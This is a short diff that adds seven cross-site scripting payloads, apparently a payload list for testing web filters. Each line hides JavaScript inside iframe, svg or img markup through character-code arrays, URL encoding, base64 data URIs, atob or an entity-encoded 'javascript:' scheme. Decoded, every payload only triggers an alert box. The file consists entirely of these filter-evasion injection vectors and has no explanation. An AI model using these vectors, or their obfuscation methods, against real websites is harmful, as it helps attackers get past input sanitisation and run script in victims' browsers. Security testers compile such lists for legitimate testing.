@@ -1,0 +1,7 @@
+<iframe src='javascri&#x70;t:eval(String.fromCharCode(97,108,101,114,116,40,39,77,83,71,39,41))'>
+<iframe srcdoc="<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>">
+<iframe srcdoc="<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>">
+<iframe src='data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgyKScpPC9zY3JpcHQ+'>
+<iframe srcdoc="<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>">
+<svg onload="eval(atob('YWxlcnQoMSk='))">
+<iframe src='data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgxKScpPC9zY3JpcHQ+'>
